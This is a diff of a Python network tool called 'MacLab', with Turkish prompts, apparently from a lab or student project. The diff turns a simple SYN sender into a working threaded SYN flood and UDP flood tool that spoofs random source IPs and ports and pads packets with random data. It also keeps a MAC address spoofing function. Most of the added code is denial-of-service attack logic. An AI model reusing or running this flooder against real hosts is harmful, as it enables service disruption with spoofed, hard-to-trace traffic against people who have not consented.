@@ -1,162 +1,168 @@
 import subprocess
 import re
 import random
+import string
+import socket
+import threading
+import time
 from scapy.all import *
 
-
-# MAC ADRESİ İŞLEMLERİ 
-#####################################################################################################################################################################################################
-
-#random mac adresi üretmemizi sağlayan fonksiyon
 def get_random_mac_address():
-    
-    mac_parts = []
+    mac_parts = [format(random.randint(0x00, 0xff), '02x') for _ in range(6)]
+    return ':'.join(mac_parts)
 
-    for _ in range(6):
-        # random kütüphanesi yardımıyla 0 ile 255 arasında bir byte seçiliyor
-        random_byte = random.randint(0x00, 0xff)
-
-        # seçilen byte'ı onaltılık formata çeviriyor 
-        hex_byte = format(random_byte, '02x')
-
-        # onaltılık formata çevrilen byte gruplarını mac_parts listesine ekliyoruz
-        mac_parts.append(hex_byte)
-
-    # onaltılık formata çevrilen byte gruplarını : işareti ile birleştirip mac adresi oluşturuyoruz
-    mac_address = ':'.join(mac_parts)
-
-    return mac_address
-
-
-# mac adresi değiştirmeyi sağlayan fonksiyon
-# kısaca subprocess kütüphanesi aracılığıyla aşağıdaki linux komutlarını çalıştırarak new_mac değişkenine atanılan random mac adresini gerçek mac adresi yerine atıyor 
 def change_mac_address(interface, new_mac):
-    subprocess.call(["sudo", "ifconfig", interface, "down"])
-    subprocess.call(["sudo", "ifconfig", interface, "hw", "ether", new_mac])
-    subprocess.call(["sudo", "ifconfig", interface, "up"])
+    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "down"])
+    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "address", new_mac])
+    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "up"])
 
-# Mac adresinin değiştirildiğini yardıran fonksiyon
 def change_mac_and_print(interface):
     new_mac_address = get_random_mac_address()
     change_mac_address(interface, new_mac_address)
     print(f"\nMAC adresi başarıyla değiştirildi. Yeni MAC adresi: {new_mac_address}")
 
-#####################################################################################################################################################################################################
-
-
-
-# iNTERFACE İŞLEMLERİ
-#####################################################################################################################################################################################################
-
-# Network interface'leri listeyen fonksiyon
 def list_network_interfaces():
     try:
-        # subprocess kütüphanesi'nin check_output özelliği ile ifconfig kodunu çalıştırıyoruz, universal_newlines=true ise ifconfig kodunun çıktısını string'e çeviriyor ve okumamızı sağlıyor
-        result = subprocess.check_output(['ifconfig'], universal_newlines = True)
+        result = subprocess.check_output(['ip', 'link'], universal_newlines=True)
         return result
     except subprocess.CalledProcessError as error:
-        # Eğer ifconfig kodunu çalıştırdığımızda hata alıyorsak önce hatanın kodunu sonra çıktısını dönüyoruz 
-        return ("Hata Kodu: " + str(error.returncode), "\n Hata Çıktısı: " + str(error.output), " \nİnterface'ler Listelenemedi.")
-    
+        return ("Hata Kodu: " + str(error.returncode), "\n Hata Çıktısı: " + str(error.output), "\nİnterface'ler Listelenemedi.")
 
-# listelenen interface'lerden istediğimizi seçmemize olanak sağlayan fonksiyon
 def select_network_interface():
-    # interface'leri listeleyen fonksiyonu çağırıyoruz
     interfaces = list_network_interfaces()
     print("Mevcut İnterface'ler:")
-    
-    # list_network_interfaces fonksiyonunun çağırdığı sonuçları re kütüphanesi ile listeye atıyoruz
-    interface_list = re.findall(r'^\S+', interfaces, re.MULTILINE)
-
-    # listelenen interface'leri ekrana yazdırıyoruz
+    interface_list = re.findall(r'^\d+: (\S+):', interfaces, re.MULTILINE)
     for i, interface in enumerate(interface_list, 1):
         print(f"{i}. {interface}")
 
-    
     while True:
         try:
-            # listelenen interfacelerden birini kullanıcıdan alıp selection değişkenine atıyoruz
             selection = int(input("İnterface seçin (1 - n): "))
-            # kullanıcıdan alınan input 1 ya da 1'den büyükse ve input interface'lerin sayısından küçükse ya da eşitse bu blok çalışır ve kullanıcının seçimine göre işlem yapmayı sağlar
-            if 1 <= selection and selection <= len(interface_list):
-                # diziler 0'dan başladığı için kullanıcının girdiği değerden 1 çıkartıyoruz ve kullanıcının seçmek istediği interface'nin indis numarasını bulup onu döndürüyoruz
+            if 1 <= selection <= len(interface_list):
                 return interface_list[selection - 1]
             else:
                 print("Geçersiz bir seçenek girdiniz. Lütfen doğru sayı girin.")
         except ValueError:
             print("Geçersiz bir giriş. Lütfen bir sayı girin.")
 
+def generate_random_data(packet_size):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=packet_size))
 
-# random ip adresi üreten fonksiyon (Şu an kullanılmıyor ilerleyen özelliklerde eğer uygun olursa dahil edilecek)
-def generate_random_ip():
-    ip = []
-    for _ in range(4):
-        ip.append(str(random.randint(0, 255)))
-    # ip dizisindeki 4 adet sayıyı . karakteri ile birleştir ve döndür
-    return '.'.join(ip)
+def random_ip_generator():
+    return '.'.join(str(random.randint(0, 255)) for _ in range(4))
 
-# syn paketi yollayan fonksiyon
-def send_syn_packet(source_ip, target_ip, target_port, packet_count):
-    # scapy kütüphanesinin bu özelliği sayesinde çıktıları ekranda görebiliyoruz bunun default değeri 2'dir.
-    # fakat biz syn paketlerinin çıktısını görmek istemediğimiz için bunu 0'a çekiyoruz
-    # long story short ekrana detay yazdırmak istiyorsak 2 yani default değer eğer ekrana detay yazdırmak istemiyorsak 0 yazıyoruz 
+def random_port():
+    return random.randint(1, 65535)
+
+def packet_size():
+    return random.randint(50, 1350)
+
+def send_packets_thread(packets):
+    sendp(packets, verbose=False)
+
+def send_syn_packet(target_ip, packet_count):
+    start_time = time.time()
     conf.verb = 0
-    
-    for _ in range(packet_count):
-        # paketi hangi ip'den hangi ip'ye, hangi port numarası üzerinden hangi bit'i yollayacağımızı ayarladığımız kod
-        packet = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
-        send(packet)
+    arp_request = ARP(op=1, pdst=target_ip)
+    arp_response = sr1(arp_request, timeout=1, verbose=0)
 
-    print(f"SYN paketi {target_ip}:{target_port} adresine gönderildi.")
+    if arp_response:
+        target_mac = arp_response.hwsrc
 
+        packets = []
+        for _ in range(packet_count):
+            source_ip = random_ip_generator()
+            source_port = random_port()
+            target_port = random_port()
 
-# syn paketini yolladığında ekrana yazdıran fonksiyon
-def send_syn_and_print():
-    source_ip = input("Kaynak IP adresini girin: ")
-    target_ip = input("Hedef IP adresini girin: ")
-    target_port = int(input("Hedef port numarasını girin: "))
-    packet_count = int(input("Yollamak istediğiniz SYN paketlerinin sayısını giriniz: "))
-    send_syn_packet(source_ip, target_ip, target_port, packet_count)
+            tcp_packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
+            data = generate_random_data(packet_size())
+            tcp_packet = tcp_packet / Raw(load=data)
+            packets.append(tcp_packet)
 
+            if len(packets) >= 100:
+                t = threading.Thread(target=send_packets_thread, args=(packets,))
+                t.start()
+                packets = []
 
+        if packets:
+            t = threading.Thread(target=send_packets_thread, args=(packets,))
+            t.start()
 
+        end_time = time.time()
+        total_time = end_time - start_time
+        print(f"{packet_count} adet SYN paketi {total_time} saniyede {target_ip} adresine gönderildi.")
 
-# UYGULAMANIN ANA MENÜSÜ
-#####################################################################################################################################################################################################
+def send_udp_packet(target_ip, packet_count):
+    start_time = time.time()
+    conf.verb = 0
+    arp_request = ARP(op=1, pdst=target_ip)
+    arp_response = sr1(arp_request, timeout=1, verbose=0)
 
-# ana menü fonksiyonu
-def main_menu():
-    print("\n--- MacLab ---")
-    print("1. İnterfaceleri listele ve MAC adresini değiştir")
-    print("2. SYN Paketi Gönder")
-    print("3. Çıkış")
+    if arp_response:
+        target_mac = arp_response.hwsrc
 
-#####################################################################################################################################################################################################
+        packets = []
+        for _ in range(packet_count):
+            source_ip = random_ip_generator()
+            source_port = random_port()
+            target_port = random_port()
 
+            udp_packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port)
+            data = generate_random_data(packet_size())
+            udp_packet = udp_packet / Raw(load=data)
+            packets.append(udp_packet)
 
+            if len(packets) >= 100:
+                t = threading.Thread(target=send_packets_thread, args=(packets,))
+                t.start()
+                packets = []
 
+        if packets:
+            t = threading.Thread(target=send_packets_thread, args=(packets,))
+            t.start()
 
-# MAİN METOTU
-#####################################################################################################################################################################################################
+        end_time = time.time()
+        total_time = end_time - start_time
+        print(f"{packet_count} adet UDP paketi {total_time} saniyede {target_ip} adresine gönderildi.")
+
+def print_mac_lab_art():
+    print("\n" + " " * 71)
+    print("       .___  ___.      ___       ______  __          ___      .______   ")
+    print("       |   \/   |     /   \     /      ||  |        /   \     |   _  \  ")
+    print("       |  \  /  |    /  ^  \   |  ,----'|  |       /  ^  \    |  |_)  | ")
+    print("       |  |\/|  |   /  /_\  \  |  |     |  |      /  /_\  \   |   _  <  ")
+    print("       |  |  |  |  /  _____  \ |  `----.|  `----./  _____  \  |  |_)  | ")
+    print("       |__|  |__| /__/     \__\ \______||_______/__/     \__\ |______/  ")
+    print("                                           DR. Gokhan Akin & Latif Altay")
+    print(" " * 71)
+
 def main():
     while True:
-        main_menu()
-        # programın ana menüsünde olan seçeneklerden birini seçmemize yardımcı olan fonksiyon
-        # seçtiğimiz değeri choice değişkenine atıyor ve işlem yapıyor
-        choice = input("Yukarıdakilerden Birini Seçiniz (1-3): ")
+        print_mac_lab_art()
+        print("\n1. İnterfaceleri listele ve MAC adresini değiştir")
+        print("2. SYN Paketi Gönder")
+        print("3. UDP Flood Paketi Gönder")
+        print("4. Çıkış")
+
+        choice = input("Seçiminizi yapın: ")
 
         if choice == '1':
-            # eğer birinci seçeneği seçersek select_network_interface fonksiyonu çağırılıyor ve network interface'leri listeleniyor
-            selected_interface = select_network_interface()
-            # ardından seçtiğimiz interface'nin mac adresine random oluşturulan mac adresi atanıyor
-            change_mac_and_print(selected_interface)
+            interface = select_network_interface()
+            change_mac_and_print(interface)
         elif choice == '2':
-            send_syn_and_print()
+            target_ip = input("Hedef IP adresini girin: ")
+            packet_count = int(input("Gönderilecek SYN paketi sayısını girin: "))
+            send_syn_packet(target_ip, packet_count)
         elif choice == '3':
-            print("\nProgramdan çıkılıyor.")
+            target_ip = input("Hedef IP adresini girin: ")
+            packet_count = int(input("Gönderilecek UDP paketi sayısını girin: "))
+            send_udp_packet(target_ip, packet_count)
+        elif choice == '4':
+            print("Programdan çıkılıyor...")
             break
         else:
-            print("\nGeçersiz bir seçenek girdiniz. Lütfen 1-3 arasında bir numara girin.")
+            print("Geçersiz seçenek. Lütfen tekrar deneyin.")
 
 if __name__ == "__main__":
     main()
